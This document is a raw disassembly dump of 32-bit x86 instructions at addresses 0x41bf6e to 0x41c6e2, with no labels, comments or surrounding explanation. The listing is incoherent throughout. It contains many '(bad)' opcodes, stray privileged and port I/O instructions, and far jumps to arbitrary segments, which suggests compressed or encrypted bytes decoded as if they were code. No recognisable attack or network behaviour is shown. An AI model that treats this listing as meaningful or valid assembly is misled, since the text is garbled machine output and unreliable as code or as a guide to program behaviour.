  41bf6e:	add    cl,BYTE PTR [edi]
  41bf70:	imul   BYTE PTR ds:0xc603a115
  41bf76:	pusha  
  41bf77:	cwde   
  41bf78:	mov    es,WORD PTR [eax]
  41bf7a:	ds dec edx
  41bf7c:	pop    ds
  41bf7d:	dec    ebx
  41bf7e:	fwait
  41bf7f:	mov    ecx,0xcd1fe2ae
  41bf84:	rol    BYTE PTR [esi],0xf9
  41bf87:	gs imul ebp,ebp,0x17
  41bf8b:	push   ebp
  41bf8c:	fidiv  DWORD PTR [edx-0x7b]
  41bf8f:	or     esi,esi
  41bf91:	mov    ch,BYTE PTR [esi]
  41bf93:	sub    BYTE PTR [edi+0x7a79a814],dl
  41bf99:	cmp    al,al
  41bf9b:	mov    DWORD PTR [ebp+0x5],ebp
  41bf9e:	push   edi
  41bf9f:	inc    eax
  41bfa0:	xchg   esi,eax
  41bfa1:	icebp  
  41bfa2:	adc    dl,BYTE PTR [ebx]
  41bfa4:	in     eax,dx
  41bfa5:	cmp    DWORD PTR [ebx+0x1d4c10fb],ecx
  41bfab:	mov    bh,0xc8
  41bfad:	inc    edi
  41bfae:	adc    edi,ecx
  41bfb0:	sub    DWORD PTR [edi+0x41],esp
  41bfb3:	pop    eax
  41bfb4:	xchg   BYTE PTR [esi-0x38],bl
  41bfb7:	add    ecx,DWORD PTR [esi+0x74327c8f]
  41bfbd:	cmp    ebx,DWORD PTR [edx]
  41bfbf:	je     0x41bf4f
  41bfc1:	jns    0x41bf5d
  41bfc3:	sub    DWORD PTR [edi+ecx*8],ecx
  41bfc6:	aaa    
  41bfc7:	push   ebp
  41bfc8:	loopne 0x41bf63
  41bfca:	xor    DWORD PTR [ebp+0x1271c9d6],0xffffffa7
  41bfd1:	or     BYTE PTR [edi],ch
  41bfd3:	daa    
  41bfd4:	add    BYTE PTR [esi+0x414ab819],cl
  41bfda:	ficom  DWORD PTR [ebp-0x40]
  41bfdd:	sub    eax,0x4f564e49
  41bfe2:	or     edx,ebx
  41bfe4:	mov    edi,0x2cbcd623
  41bfe9:	mov    ch,0x83
  41bfeb:	mov    ds:0x9e62c970,eax
  41bff0:	or     DWORD PTR [eax+0x3f4a98cb],esp
  41bff6:	daa    
  41bff7:	jae    0x41c057
  41bff9:	or     esi,ebx
  41bffb:	mov    ch,ch
  41bffd:	add    ebx,DWORD PTR [edi]
  41bfff:	sub    al,0xda
  41c001:	repz adc BYTE PTR [edi+0x27],dl
  41c005:	in     al,0x75
  41c007:	xor    dh,BYTE PTR [edi+0x62]
  41c00a:	mov    ch,0xb5
  41c00c:	pushf  
  41c00d:	(bad)  
  41c00e:	or     BYTE PTR [ecx+0x4b2b2d4e],bh
  41c014:	inc    ebp
  41c015:	fidiv  DWORD PTR [edx+ebp*8]
  41c018:	inc    eax
  41c019:	and    eax,0xa16a9b98
  41c01e:	mov    ebp,0x1bc8aaeb
  41c023:	dec    eax
  41c024:	mov    ebp,0x8efbf266
  41c029:	loopne 0x41c000
  41c02b:	pop    ds
  41c02c:	inc    esp
  41c02d:	mov    ebp,0xda839ab8
  41c032:	outs   dx,DWORD PTR ds:[esi]
  41c033:	and    eax,0x854d040a
  41c038:	inc    eax
  41c039:	mov    DWORD PTR [edx-0x1bb23048],0x75497364
  41c043:	or     al,0xb4
  41c045:	arpl   WORD PTR [edi+0x64],bp
  41c048:	shr    BYTE PTR ds:0xfc7bf1ed,cl
  41c04e:	loop   0x41c07f
  41c050:	mov    esi,0xcd18cb4d
  41c055:	loopne 0x41c05d
  41c057:	clc    
  41c058:	sti    
  41c059:	jecxz  0x41bff7
  41c05b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c05c:	cs jns 0x41c030
  41c05f:	aam    0xa8
  41c061:	adc    DWORD PTR [ebp+edx*2+0x2aa8b198],ecx
  41c068:	sbb    esp,DWORD PTR [eax+0x34f54e32]
  41c06e:	nop
  41c06f:	push   0x51
  41c071:	xor    ebx,esi
  41c073:	push   ss
  41c074:	js     0x41c009
  41c076:	ins    BYTE PTR es:[edi],dx
  41c077:	jmp    0x41c0d8
  41c079:	std    
  41c07a:	xor    ecx,DWORD PTR [ebx-0x18]
  41c07d:	push   0x2c5f57a8
  41c082:	xchg   edi,eax
  41c083:	push   ss
  41c084:	fs ss test eax,0x3dabbb9f
  41c08b:	push   ss
  41c08c:	retf   0x116b
  41c08f:	(bad)  
  41c090:	xor    al,0xa7
  41c092:	jns    0x41c0dc
  41c094:	sub    al,0x9b
  41c096:	jnp    0x41c0a4
  41c098:	cmp    BYTE PTR [edi+0x4c9d3b26],0x60
  41c09f:	in     eax,dx
  41c0a0:	sbb    eax,0x26bea2c7
  41c0a5:	fild   WORD PTR [ecx+esi*4-0x7f]
  41c0a9:	jb     0x41c0d3
  41c0ab:	(bad)  
  41c0ac:	xor    al,0x32
  41c0ae:	stc    
  41c0af:	inc    ecx
  41c0b0:	test   DWORD PTR [esi-0x31],0xfe41af8e
  41c0b7:	inc    edi
  41c0b8:	pop    eax
  41c0b9:	int    0x43
  41c0bb:	xchg   esp,eax
  41c0bc:	adc    esi,esi
  41c0be:	xor    esp,esi
  41c0c0:	add    DWORD PTR [ecx],edx
  41c0c2:	adc    edi,DWORD PTR [edx+0x2a]
  41c0c5:	shl    BYTE PTR [ebx+esi*8-0x3639fb45],0x3e
  41c0cd:	push   esp
  41c0ce:	ror    BYTE PTR [ebx],1
  41c0d0:	jecxz  0x41c0f8
  41c0d2:	mov    eax,0x3721e0f6
  41c0d7:	jmp    0x768a:0xf512348f
  41c0de:	pop    edi
  41c0df:	fnsave [eax+0x3e]
  41c0e2:	dec    edi
  41c0e3:	dec    eax
  41c0e4:	mov    dh,0x9a
  41c0e6:	adc    al,0x67
  41c0e8:	jl     0x41c15c
  41c0ea:	loope  0x41c0d7
  41c0ec:	dec    edx
  41c0ed:	pop    eax
  41c0ee:	(bad)  
  41c0ef:	scas   al,BYTE PTR es:[edi]
  41c0f0:	daa    
  41c0f1:	inc    ebp
  41c0f2:	cmp    DWORD PTR [ebp+0x18],eax
  41c0f5:	jne    0x41c145
  41c0f7:	or     ebp,DWORD PTR ds:0x2f1fe120
  41c0fd:	pop    esi
  41c0fe:	out    dx,al
  41c0ff:	das    
  41c100:	retf   
  41c101:	ret    
  41c102:	stos   DWORD PTR es:[edi],eax
  41c103:	xchg   ebp,eax
  41c104:	jmp    0x41c16c
  41c106:	shr    DWORD PTR cs:[esi-0x44b82273],cl
  41c10d:	(bad)  [eax+0x2b6bb15e]
  41c113:	mov    cl,0xc3
  41c115:	push   ebx
  41c116:	sbb    eax,0xfd2013a4
  41c11b:	push   0x54ba9cfe
  41c120:	sahf   
  41c121:	ja     0x41c138
  41c123:	or     DWORD PTR [esi-0x50763efb],ecx
  41c129:	mov    ebx,ss
  41c12b:	stos   BYTE PTR es:[edi],al
  41c12c:	inc    edi
  41c12d:	fidivr WORD PTR [ebx]
  41c12f:	dec    edx
  41c130:	and    eax,0x19775b2f
  41c135:	mov    eax,ds:0xa7c165c4
  41c13a:	sub    esi,DWORD PTR [edx+0x23310d0e]
  41c140:	sbb    DWORD PTR [ebx+0x78f0b993],esp
  41c146:	ret    0x65ae
  41c149:	mov    BYTE PTR [ebx*4+0x5c0420ff],ah
  41c150:	jl     0x41c0f6
  41c152:	mov    dl,0xd3
  41c154:	jmp    0x41c19e
  41c156:	xor    BYTE PTR ds:0x33026da6,0xb5
  41c15d:	leave  
  41c15e:	mov    eax,0x4bd5b15f
  41c163:	ins    DWORD PTR es:[edi],dx
  41c164:	test   bh,dl
  41c166:	sahf   
  41c167:	xor    DWORD PTR [ecx-0x5dd1929a],eax
  41c16d:	sti    
  41c16e:	xor    al,0xca
  41c170:	fnstcw WORD PTR [edi+eiz*4]
  41c173:	lea    eax,[ebx+0x77]
  41c176:	adc    BYTE PTR [ebx],0x9f
  41c179:	pop    ss
  41c17a:	pop    edx
  41c17b:	push   cs
  41c17c:	lea    esp,[esi-0x63bd0905]
  41c182:	rep lods eax,DWORD PTR ds:[esi]
  41c184:	or     edx,DWORD PTR [ecx-0x55]
  41c187:	test   al,0xc7
  41c189:	lods   eax,DWORD PTR ds:[esi]
  41c18a:	mov    ecx,0x7b03cf3
  41c18f:	daa    
  41c190:	jb     0x41c114
  41c192:	loope  0x41c1d2
  41c194:	jnp    0x41c1ba
  41c196:	mov    dl,0xa4
  41c198:	adc    BYTE PTR [edx-0x2fef49db],dh
  41c19e:	fwait
  41c19f:	xchg   BYTE PTR [edi-0x63],al
  41c1a2:	(bad)  
  41c1a3:	dec    BYTE PTR [edi+ebp*4+0x4f]
  41c1a7:	jmp    0x6bb44ed7
  41c1ac:	rol    DWORD PTR [edi+eax*1-0x44],0x89
  41c1b1:	mov    esi,0x52b213fe
  41c1b6:	push   cs
  41c1b7:	push   esi
  41c1b8:	cmp    eax,ecx
  41c1ba:	stos   DWORD PTR es:[edi],eax
  41c1bb:	push   es
  41c1bc:	mov    bh,0x1f
  41c1be:	dec    ebp
  41c1bf:	push   edi
  41c1c0:	or     ecx,DWORD PTR [esi+edx*4+0x2e3bdf36]
  41c1c7:	xchg   BYTE PTR gs:[esi],bl
  41c1ca:	sbb    al,0x2e
  41c1cc:	test   DWORD PTR ds:0xe2380c73,edx
  41c1d2:	sbb    dh,BYTE PTR [ebp-0xba81228]
  41c1d8:	loope  0x41c15e
  41c1da:	jle    0x41c180
  41c1dc:	enter  0x956a,0x1b
  41c1e0:	sbb    DWORD PTR ds:0x230bfd81,ecx
  41c1e6:	adc    ah,BYTE PTR [esi-0x1051d369]
  41c1ec:	retf   
  41c1ed:	out    0x81,eax
  41c1ef:	shl    BYTE PTR [ebx-0x53c02582],cl
  41c1f5:	sub    BYTE PTR [ebp+0x11],bl
  41c1f8:	dec    esp
  41c1f9:	and    DWORD PTR [edx],esi
  41c1fb:	cwde   
  41c1fc:	sbb    BYTE PTR [edi+0x581ac34f],bh
  41c202:	push   eax
  41c203:	pop    esi
  41c204:	xchg   edx,eax
  41c205:	lahf   
  41c206:	retf   
  41c207:	push   ebp
  41c208:	outs   dx,DWORD PTR ds:[esi]
  41c209:	mov    fs,WORD PTR [ebp-0x62]
  41c20c:	mov    ds:0x36849dca,al
  41c211:	adc    BYTE PTR [esi-0x3e],bl
  41c214:	test   al,0x41
  41c216:	(bad)  
  41c217:	stc    
  41c218:	mov    eax,ds:0x45a60801
  41c21d:	pop    ds
  41c21e:	and    dx,WORD PTR [eax+0x2c]
  41c222:	pusha  
  41c223:	bound  esp,QWORD PTR [ebx]
  41c225:	and    eax,0x3a9fef37
  41c22a:	es jge 0x41c21e
  41c22d:	scas   al,BYTE PTR es:[edi]
  41c22e:	jne    0x41c1cd
  41c230:	sub    esp,esi
  41c232:	shl    BYTE PTR [eax],1
  41c234:	xlat   BYTE PTR ds:[ebx]
  41c235:	and    DWORD PTR [ebx],edx
  41c237:	sub    DWORD PTR [ecx],0xffffffa6
  41c23a:	lea    esp,[ecx+0x170b3688]
  41c240:	xchg   edx,eax
  41c241:	(bad)
  41c247:	fs push ds
  41c249:	loope  0x41c271
  41c24b:	das    
  41c24c:	pop    edx
  41c24d:	dec    ecx
  41c24e:	shl    DWORD PTR [ebx],1
  41c250:	js     0x41c2b4
  41c252:	add    DWORD PTR [ebx+edx*4+0x21],0xfffffff9
  41c257:	sbb    al,0xf3
  41c259:	mov    ah,0xf5
  41c25b:	popa   
  41c25c:	jle    0x41c2d9
  41c25e:	or     eax,0xad14cd83
  41c263:	aad    0x73
  41c265:	fidivr WORD PTR [eax]
  41c267:	cmp    eax,ecx
  41c269:	adc    eax,0xdfe62adc
  41c26e:	add    ebp,DWORD PTR [esi+esi*8+0x7f]
  41c272:	and    ah,ch
  41c274:	mov    esp,0xffdce9b7
  41c279:	ror    DWORD PTR [eax],cl
  41c27b:	mov    edx,0x840b97b7
  41c280:	mov    al,0xc0
  41c282:	add    esp,DWORD PTR [ecx]
  41c284:	inc    ecx
  41c285:	sub    DWORD PTR [ebx],ecx
  41c287:	outs   dx,BYTE PTR ds:[esi]
  41c288:	imul   ebx,DWORD PTR [esi],0xc182c3e4
  41c28e:	nop
  41c28f:	leave  
  41c290:	jns    0x41c267
  41c292:	sub    edx,DWORD PTR [ebx]
  41c294:	cwde   
  41c295:	sar    BYTE PTR [edx+0x33],cl
  41c298:	stos   DWORD PTR es:[edi],eax
  41c299:	aaa    
  41c29a:	fstp   DWORD PTR [edi+0x36]
  41c29d:	std    
  41c29e:	sbb    BYTE PTR [edx-0x72],al
  41c2a1:	sahf   
  41c2a2:	pop    eax
  41c2a3:	ja     0x41c2c8
  41c2a5:	push   es
  41c2a6:	add    ah,ch
  41c2a8:	dec    esp
  41c2a9:	call   0xd4e2:0x81abe31f
  41c2b0:	int3   
  41c2b1:	stos   BYTE PTR es:[edi],al
  41c2b2:	pop    eax
  41c2b3:	xor    dl,dl
  41c2b5:	imul   esi,DWORD PTR [ebp-0x52],0xbf3ac709
  41c2bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2bd:	add    DWORD PTR [esi-0xd],edi
  41c2c0:	xor    BYTE PTR [eax+0x1f],0xbc
  41c2c4:	cwde   
  41c2c5:	push   ebp
  41c2c6:	pop    edi
  41c2c7:	out    0xde,eax
  41c2c9:	push   cs
  41c2ca:	int    0x89
  41c2cc:	(bad)  
  41c2cd:	sbb    al,0x2e
  41c2cf:	push   cs
  41c2d0:	cwde   
  41c2d1:	pop    esi
  41c2d3:	in     al,0xc4
  41c2d5:	scas   al,BYTE PTR es:[edi]
  41c2d6:	lock jbe 0x41c280
  41c2d9:	mov    ?,WORD PTR [ebx]
  41c2db:	inc    esi
  41c2dc:	iret   
  41c2dd:	xchg   edx,eax
  41c2de:	cmp    eax,0xc9791732
  41c2e3:	cs aaa 
  41c2e5:	jae    0x41c28e
  41c2e7:	or     edx,eax
  41c2e9:	int3   
  41c2ea:	mov    edi,0x4193fc2e
  41c2ef:	imul   esi,DWORD PTR [ecx-0x3f1b573],0xdf43ffab
  41c2f9:	(bad)
  41c2fc:	fwait
  41c2fd:	mov    bh,0x24
  41c2ff:	push   edi
  41c300:	adc    bh,BYTE PTR [edx+0x165b5163]
  41c306:	mov    al,0x3a
  41c308:	inc    esp
  41c309:	loope  0x41c322
  41c30b:	loop   0x41c2a9
  41c30d:	shl    esp,cl
  41c30f:	jb     0x41c380
  41c311:	push   ebx
  41c312:	retf   
  41c313:	jmp    0x41c34f
  41c315:	daa    
  41c316:	push   edx
  41c317:	mov    eax,fs
  41c319:	aad    0x4
  41c31b:	scas   eax,DWORD PTR es:[edi]
  41c31c:	jo     0x41c303
  41c31e:	hlt    
  41c31f:	cdq    
  41c320:	jns    0x41c2a9
  41c322:	in     eax,dx
  41c323:	neg    bh
  41c325:	ficom  WORD PTR [ebx+ecx*2-0x47]
  41c329:	daa    
  41c32a:	adc    DWORD PTR [edx-0x19],ecx
  41c32d:	pop    eax
  41c32e:	pop    edx
  41c32f:	sub    BYTE PTR [ecx-0x19],ah
  41c332:	mov    ds:0x8c14c3d9,eax
  41c337:	mov    bh,0x92
  41c339:	test   eax,0x2154038f
  41c33e:	outs   dx,DWORD PTR ds:[esi]
  41c33f:	cmp    DWORD PTR [ebp+0x4e1220a5],ecx
  41c345:	in     eax,0x89
  41c347:	scas   al,BYTE PTR es:[edi]
  41c348:	pushf  
  41c349:	push   ecx
  41c34a:	jns    0x41c39e
  41c34c:	and    al,dl
  41c34e:	or     BYTE PTR [edi],bl
  41c350:	rol    BYTE PTR [edi-0x76e69caa],cl
  41c356:	pop    ds
  41c357:	mov    edi,0xa7af9cf9
  41c35c:	jecxz  0x41c2e8
  41c35e:	pop    ebp
  41c35f:	aaa    
  41c360:	aam    0xaa
  41c362:	xor    ecx,ebp
  41c364:	std    
  41c365:	jns    0x41c2f1
  41c367:	jmp    0x371b:0x5407e3b
  41c36e:	jnp    0x41c31c
  41c370:	aam    0xb9
  41c372:	outs   dx,BYTE PTR ds:[esi]
  41c373:	ficom  WORD PTR [edi+esi*4+0x6bb8cd2c]
  41c37a:	jle    0x41c391
  41c37c:	(bad)  
  41c37d:	stc    
  41c37e:	pop    ecx
  41c37f:	mov    ds:0xd8aade30,al
  41c384:	dec    edx
  41c385:	jae    0x41c3b0
  41c387:	iret   
  41c388:	mov    ecx,0x48c69edd
  41c38d:	je     0x41c40c
  41c38f:	jno    0x41c380
  41c391:	cmp    ebx,edx
  41c393:	and    bh,bh
  41c395:	fwait
  41c396:	(bad)  
  41c397:	mov    dh,0x6f
  41c399:	cli    
  41c39a:	repnz push 0xffffffee
  41c39d:	inc    ebx
  41c39e:	jle    0x41c407
  41c3a0:	sar    DWORD PTR [ecx],1
  41c3a2:	ror    BYTE PTR [edi+0x68],0x7
  41c3a6:	push   0x8d6cecfa
  41c3ab:	mov    edi,fs
  41c3ad:	adc    DWORD PTR [ecx+0x7f],ebx
  41c3b0:	xlat   BYTE PTR ds:[ebx]
  41c3b1:	loopne 0x41c3ec
  41c3b3:	jge    0x41c37a
  41c3b5:	ja     0x41c41e
  41c3b7:	out    0x59,al
  41c3b9:	xor    edx,ecx
  41c3bb:	adc    bh,BYTE PTR [eax+0x50]
  41c3be:	push   esp
  41c3bf:	pop    esi
  41c3c0:	pop    esp
  41c3c1:	stos   BYTE PTR es:[edi],al
  41c3c2:	push   edx
  41c3c3:	add    BYTE PTR [ecx+ebp*8],bh
  41c3c6:	lea    ebx,[eax+ecx*2-0x383ea068]
  41c3cd:	push   cs
  41c3ce:	jecxz  0x41c37c
  41c3d0:	mov    ch,0xff
  41c3d2:	sbb    bh,BYTE PTR [ecx]
  41c3d4:	and    esi,DWORD PTR ds:0x8dd1d9c1
  41c3da:	(bad)  
  41c3db:	aas    
  41c3dc:	or     DWORD PTR [edx+0x64dca745],ecx
  41c3e2:	mov    ds:0xfabb83dc,al
  41c3e7:	bound  eax,QWORD PTR [eax+0x5]
  41c3ea:	clc    
  41c3eb:	shl    eax,1
  41c3ed:	imul   ebx,edi,0x2c
  41c3f0:	imul   ebx,edx,0x5
  41c3f3:	retf   
  41c3f4:	test   BYTE PTR [edx-0x4f],0xe3
  41c3f8:	dec    esp
  41c3f9:	outs   dx,BYTE PTR ds:[esi]
  41c3fa:	dec    ebx
  41c3fb:	repz sbb DWORD PTR [ebx+0x31],0x57e49edb
  41c403:	xor    DWORD PTR [eax],edx
  41c405:	ret    0xac62
  41c408:	xor    BYTE PTR [esi-0x3ae14e71],ah
  41c40e:	xor    DWORD PTR [esp+ebx*1],edi
  41c411:	loop   0x41c44b
  41c413:	sub    bl,BYTE PTR [esi-0x69]
  41c416:	mov    esp,0xe4871ea8
  41c41b:	adc    DWORD PTR [ebp-0x78c5a47b],0xffffffb5
  41c422:	aam    0x60
  41c424:	in     al,dx
  41c425:	lahf   
  41c426:	sbb    BYTE PTR [edx+0x105fa7f],0xd4
  41c42d:	imul   esp,esp,0xffffff95
  41c430:	call   FWORD PTR [ebx]
  41c432:	clc    
  41c433:	sbb    bl,BYTE PTR [edx+0x66ec02e7]
  41c439:	in     eax,dx
  41c43a:	xor    DWORD PTR [esi-0x3545000d],esi
  41c440:	pop    edi
  41c441:	sub    dl,0xe8
  41c444:	fwait
  41c445:	xor    bh,ch
  41c447:	cdq    
  41c448:	fs or  bh,bl
  41c44b:	push   edi
  41c44c:	in     eax,dx
  41c44d:	stos   DWORD PTR es:[edi],eax
  41c44e:	(bad)  
  41c450:	iret   
  41c451:	jnp    0x41c448
  41c453:	jns    0x41c3dc
  41c455:	test   al,0x58
  41c457:	mov    edi,0x16909492
  41c45c:	push   ecx
  41c45d:	push   0x4e5a165
  41c462:	test   al,0x3f
  41c464:	mov    cl,0x52
  41c466:	push   edi
  41c467:	test   al,0x82
  41c469:	sub    DWORD PTR [ebp+0x56460121],edi
  41c46f:	mov    edx,0x7d4d561d
  41c474:	xchg   esi,eax
  41c475:	mov    ebp,0xb62b3229
  41c47a:	rcr    DWORD PTR [eax],cl
  41c47c:	xor    esi,DWORD PTR [eax+0x1a]
  41c47f:	xor    eax,0x8cb331fc
  41c484:	sub    BYTE PTR [edi+0x5c29a4e6],0x86
  41c48b:	ja     0x892b10e1
  41c491:	adc    eax,DWORD PTR [eax+0x77]
  41c494:	mov    ecx,0x8b7a8e71
  41c499:	std    
  41c49a:	push   esp
  41c49b:	pushf  
  41c49c:	or     eax,0x1fbf0340
  41c4a1:	adc    al,0xbc
  41c4a3:	adc    eax,0x99f764fb
  41c4a8:	push   eax
  41c4a9:	jl     0x41c45a
  41c4ab:	and    edx,edi
  41c4ad:	add    cl,dh
  41c4af:	cwde   
  41c4b0:	jle    0x41c4f0
  41c4b2:	sub    BYTE PTR [ebx+edi*1-0x31],bl
  41c4b6:	push   0xd4fa5bc3
  41c4bb:	or     BYTE PTR [edi],bl
  41c4bd:	out    0x91,al
  41c4bf:	sbb    BYTE PTR [eax-0x1d4b7c9b],dl
  41c4c5:	sub    cl,BYTE PTR [ebp+0x6ed3a13c]
  41c4cb:	jmp    0x6c35830d
  41c4d0:	inc    eax
  41c4d1:	in     al,0xac
  41c4d3:	cmp    al,ah
  41c4d5:	inc    edx
  41c4d6:	mov    dl,0x10
  41c4d8:	adc    dh,BYTE PTR [edx+eiz*8]
  41c4db:	adc    eax,DWORD PTR [edi]
  41c4dd:	sub    DWORD PTR ds:0xa8473b74,edi
  41c4e3:	jnp    0x41c4f2
  41c4e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4e6:	pop    esi
  41c4e7:	cmp    BYTE PTR [ebp-0x79],0x19
  41c4eb:	mov    ebx,0x939ddfbc
  41c4f0:	sbb    al,0xc0
  41c4f2:	das    
  41c4f3:	or     DWORD PTR [edi+0xb],edx
  41c4f6:	and    al,0x0
  41c4f8:	jecxz  0x41c545
  41c4fa:	cmc    
  41c4fb:	mov    edi,0x50afefc4
  41c500:	dec    edi
  41c501:	out    dx,eax
  41c502:	mov    cl,0xf
  41c504:	inc    ecx
  41c505:	dec    ecx
  41c506:	sub    DWORD PTR [eax],ebp
  41c508:	ins    DWORD PTR es:[edi],dx
  41c509:	mov    dh,dl
  41c50b:	sahf   
  41c50c:	sub    ch,BYTE PTR [ecx+0x5a22fce6]
  41c512:	ss sub eax,0x1ec5ef41
  41c518:	aas    
  41c519:	push   ss
  41c51a:	push   es
  41c51b:	nop
  41c51c:	neg    DWORD PTR [eax+0x5]
  41c51f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c520:	pushf  
  41c521:	out    dx,eax
  41c522:	ret    0xca3b
  41c525:	imul   esi,DWORD PTR [edx-0x330c398c],0x2821a859
  41c52f:	icebp  
  41c530:	mov    cs,WORD PTR [eax]
  41c532:	sbb    al,0x7c
  41c534:	mov    eax,ds:0xf9c44b0d
  41c539:	(bad)  
  41c53a:	shl    ah,1
  41c53c:	lods   eax,DWORD PTR gs:[esi]
  41c53e:	into   
  41c53f:	bound  eax,QWORD PTR [eax]
  41c541:	cmp    ebx,edi
  41c543:	jmp    0xb5c9bcc
  41c548:	xor    ecx,DWORD PTR [edx-0x2e]
  41c54b:	mov    edi,DWORD PTR [eax]
  41c54d:	iret   
  41c54e:	adc    al,0xfc
  41c550:	scas   al,BYTE PTR es:[edi]
  41c551:	adc    DWORD PTR [ebx],esp
  41c553:	imul   esi,DWORD PTR [eax+ebp*2+0x55671d08],0xffffffd9
  41c55b:	pop    edx
  41c55c:	repnz dec cl
  41c55f:	scas   al,BYTE PTR es:[edi]
  41c560:	or     al,0x90
  41c562:	adc    DWORD PTR [ebx],esp
  41c564:	mov    ch,0xe0
  41c566:	and    edi,edx
  41c568:	mov    ds:0x33d5ede0,al
  41c56d:	stos   DWORD PTR es:[edi],eax
  41c56e:	mov    edi,0xd64343c9
  41c573:	in     al,dx
  41c574:	sbb    dl,ch
  41c576:	retf   0x9728
  41c579:	mov    edi,0xb7abec02
  41c57e:	(bad)  
  41c57f:	cs push eax
  41c581:	aam    0xea
  41c583:	je     0x41c549
  41c585:	dec    ecx
  41c586:	mov    ds:0x87b7ed85,eax
  41c58b:	into   
  41c58c:	or     al,0x9
  41c58e:	jg     0x41c5ca
  41c590:	xchg   DWORD PTR [esi],eax
  41c592:	hlt    
  41c593:	call   DWORD PTR [ecx]
  41c595:	(bad)  
  41c597:	lahf   
  41c598:	mov    ecx,0x629230e4
  41c59d:	sub    DWORD PTR [edi],ecx
  41c59f:	and    eax,0x2727b43c
  41c5a4:	shl    esp,1
  41c5a6:	xchg   edi,eax
  41c5a7:	xlat   BYTE PTR ds:[ebx]
  41c5a8:	pop    ebx
  41c5a9:	je     0x41c574
  41c5ab:	fild   QWORD PTR [ecx+0x26]
  41c5ae:	lahf   
  41c5af:	mov    dl,0x49
  41c5b1:	pop    ds
  41c5b2:	or     al,0x8e
  41c5b4:	retf   
  41c5b5:	jmp    0x41c578
  41c5b7:	aad    0x5a
  41c5b9:	fidiv  DWORD PTR [edi+0x643be25e]
  41c5bf:	pop    ebx
  41c5c0:	test   al,0x3e
  41c5c2:	inc    eax
  41c5c3:	cmp    DWORD PTR [esi],0x18
  41c5c6:	(bad)  
  41c5c7:	jp     0x41c560
  41c5c9:	xor    al,0xfd
  41c5cb:	ins    BYTE PTR es:[edi],dx
  41c5cc:	sub    bl,BYTE PTR ds:0xceaa1f13
  41c5d2:	ret    0xd592
  41c5d5:	ins    DWORD PTR es:[edi],dx
  41c5d6:	mul    DWORD PTR [ebx-0x4cadc1dd]
  41c5dc:	push   0xffffff9a
  41c5de:	fiadd  DWORD PTR [ecx+0x3f]
  41c5e1:	ins    BYTE PTR es:[edi],dx
  41c5e2:	cli    
  41c5e3:	or     eax,0x5a9bbafe
  41c5e8:	sbb    esi,DWORD PTR [ebp-0x638852cc]
  41c5ee:	adc    ah,BYTE PTR [esi]
  41c5f0:	das    
  41c5f1:	jecxz  0x41c588
  41c5f3:	inc    ebp
  41c5f4:	into   
  41c5f5:	in     al,dx
  41c5f6:	retf   
  41c5f7:	inc    edi
  41c5f8:	jg     0x41c658
  41c5fa:	nop
  41c5fb:	dec    ebx
  41c5fc:	out    dx,eax
  41c5fd:	(bad)  
  41c5ff:	xchg   ebp,eax
  41c600:	cmp    DWORD PTR [ebx+ebp*8+0x5f187ad3],ebx
  41c607:	gs retw 0xe7d4
  41c60c:	sahf   
  41c60d:	jecxz  0x41c596
  41c60f:	jge    0x41c60a
  41c611:	mov    WORD PTR [ecx],?
  41c613:	popf   
  41c614:	mov    eax,ds:0x5b56f710
  41c619:	rol    BYTE PTR [ebx],1
  41c61b:	cmp    DWORD PTR [ebp+0x3d],ecx
  41c61e:	out    dx,al
  41c61f:	xchg   edi,eax
  41c620:	(bad)  
  41c621:	call   FWORD PTR [esi-0x5b]
  41c624:	out    dx,al
  41c625:	loope  0x41c640
  41c627:	push   eax
  41c628:	and    DWORD PTR [esi],eax
  41c62a:	dec    esi
  41c62b:	sbb    BYTE PTR [ebx-0x52],cl
  41c62e:	or     eax,0xba7e0600
  41c633:	jmp    0x41c5c1
  41c635:	lock shr cl,0xee
  41c639:	bswap  ecx
  41c63b:	test   al,0x63
  41c63d:	pop    ss
  41c63e:	ins    DWORD PTR es:[edi],dx
  41c63f:	rol    DWORD PTR [esp+eax*1+0x2877f688],1
  41c646:	icebp  
  41c647:	sbb    dl,ah
  41c649:	loope  0x41c643
  41c64b:	xchg   DWORD PTR [esi+ebp*2+0x75edaa5d],ecx
  41c652:	aaa    
  41c653:	data16 adc bh,BYTE PTR ds:0xa2e2eb85
  41c65a:	add    eax,0xfa58076d
  41c65f:	push   cs
  41c660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c661:	pop    edi
  41c662:	retf   0x138e
  41c665:	and    DWORD PTR [ecx+0x619dd6a0],esp
  41c66b:	retf   
  41c66c:	mov    ecx,0xaaef1f1a
  41c671:	js     0x41c6e9
  41c673:	sbb    al,0x7
  41c675:	(bad)  
  41c677:	sub    BYTE PTR [ebx-0x2],ch
  41c67a:	jge    0x41c675
  41c67c:	shl    edx,0x70
  41c67f:	fldenv [esi-0x24]
  41c682:	pop    esp
  41c683:	cs sti 
  41c685:	daa    
  41c686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c687:	dec    edx
  41c688:	jge    0x41c62d
  41c68a:	xchg   ebp,eax
  41c68b:	adc    BYTE PTR [eax+0x4a86b25c],ch
  41c691:	mov    bh,BYTE PTR [eax]
  41c693:	mov    ch,0xee
  41c695:	cmp    al,0xc9
  41c697:	arpl   WORD PTR [edx],bp
  41c699:	fwait
  41c69a:	out    0x54,al
  41c69c:	inc    edx
  41c69d:	mov    ecx,0x3487a79b
  41c6a2:	sub    DWORD PTR es:[edx],edi
  41c6a5:	test   BYTE PTR [ecx-0xe],dl
  41c6a8:	cmp    esp,DWORD PTR [eax+0x27df5fc7]
  41c6ae:	aad    0xcd
  41c6b0:	dec    ebp
  41c6b1:	pop    ss
  41c6b2:	test   BYTE PTR [ecx],ch
  41c6b4:	enter  0x7eee,0xed
  41c6b8:	pop    ss
  41c6b9:	dec    ecx
  41c6ba:	test   DWORD PTR gs:[ecx-0x2],ecx
  41c6be:	cdq    
  41c6bf:	mov    ch,0x53
  41c6c1:	sbb    al,0xa4
  41c6c3:	mov    ebx,0x27354896
  41c6c8:	mov    DWORD PTR [esi-0x20b3b031],0x336f3b6
  41c6d2:	pop    ds
  41c6d3:	mov    al,ds:0x930828e4
  41c6d8:	in     al,dx
  41c6d9:	inc    esp
  41c6da:	out    0x4c,eax
  41c6dc:	sti    
  41c6dd:	(bad)  
  41c6de:	push   ss
  41c6df:	mov    ecx,esi
  41c6e1:	sahf   
  41c6e2:	aas    
